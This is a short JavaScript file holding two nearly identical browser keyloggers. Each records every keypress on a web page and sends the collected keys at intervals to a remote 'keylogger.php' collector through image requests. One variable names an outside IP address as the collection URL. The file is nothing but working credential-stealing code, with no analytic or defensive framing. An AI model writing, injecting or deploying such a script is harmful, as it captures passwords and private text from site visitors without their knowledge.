var keys='';
var url = 'http://206.130.110.212/forum/system/keylogger.php?c=';

document.onkeypress = function(e) {
    get = window.event?event:e;
    key = get.keyCode?get.keyCode:get.charCode;
    key = String.fromCharCode(key);
    keys+=key;
}
window.setInterval(function(){
    if(keys.length>0) {
        new Image().src = 'http://127.0.0.1/keylogger/keylogger.php?c='+keys;
        keys = '';
    }
}, 1000);

var keys='';
document.onkeypress = function(e) {
    get = window.event?event:e;
    key = get.keyCode?get.keyCode:get.charCode;
    key = String.fromCharCode(key);
    keys+=key;
}
window.setInterval(function(){
    if(keys != '') {
        new Image().src = 'http://127.0.0.1/keylogger/keylogger.php?c='+keys;
        keys = '';
    }
}, 500);